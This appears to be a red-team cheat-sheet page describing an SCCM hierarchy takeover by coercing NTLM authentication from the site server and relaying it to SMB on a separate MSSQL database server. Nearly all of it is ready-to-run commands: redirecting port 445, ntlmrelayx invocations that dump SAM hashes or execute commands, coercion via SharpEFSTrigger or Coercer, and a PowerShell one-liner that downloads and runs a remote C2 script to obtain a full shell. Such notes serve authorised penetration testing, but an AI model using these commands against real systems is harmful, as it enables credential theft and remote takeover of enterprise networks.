# Full Shell RCE

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/takeover-2

## Description

Hierarchy takeover via NTLM coercion and relay to SMB on remote site database

## Requirements

1) PKI certificates are not required for client authentication (default)

2) SCCM database server hosted on a system that is independent of the main site server

3) SMB is reachable and SMB signing isn’t required on the site database server

4) Local Administrator if performing the attack from Windows (due to SMB port redirect)

## Tools required

1) divertTCPConn: https://github.com/Arno0x/DivertTCPconn

2) Coercion Tools: https://github.com/The-Viper-One/RedTeam-Pentest-Tools/tree/main/Coercion

3) ntlmrelayx: https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/Relay/ntlmrelayx.exe

## Windows

### 1) Divert SMB on port 445 to port 8445 (Requires Local Administrator)

    divertTCPconn.exe 445 8445

### 2) Set up ntlmrelayx to the alternate SMB port and to point at the MSSQL database server

##### Dump SAM

    ntlmrelayx.exe --smb-port 8445 -smb2support -t <MSSQL SSCM IP>

##### Execute Commands

    ntlmrelayx.exe --smb-port 8445 -smb2support -t 192.168.60.12 -c "[Command]"

### 3) Use SharpEFSTrigger to coerce the SCCM Site Server computer account to the MSSQL database server.

##### Option 2: SharpEFSTrigger

    SharpEFSTrigger.exe <Site Server IP> <Listener IP> EfsRpcDecryptFileSrv

##### Option 1: Coercer

    Coercer.exe coerce -u [Username] -p "[Password]" -d [Domain] -t [Site Server IP] -l [Listener IP] --auth-type smb --filter-method-name EfsRpcDecryptFileSrv

## Getting a full shell on Windows with Amnesiac C2

Link: https://github.com/Leo4j/Amnesiac

### 1) Load Amnesiac through Powershell

    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac

### 2) Generate a global listener payload with option [2]

### 3) Use the payload within ntlmrelayx to be executed on the target system.

##### Setup with ntlmrelayx
    
    ntlmrelayx.exe -t 192.168.60.12 -smb2support --smb-port 8445 -c "[PAYLOAD]"

### 4) Once we trigger coercion again, ntlmrelayx will execute the powershell payload on the target system. Once this is done, use option [3] on Amnesiac to connect.

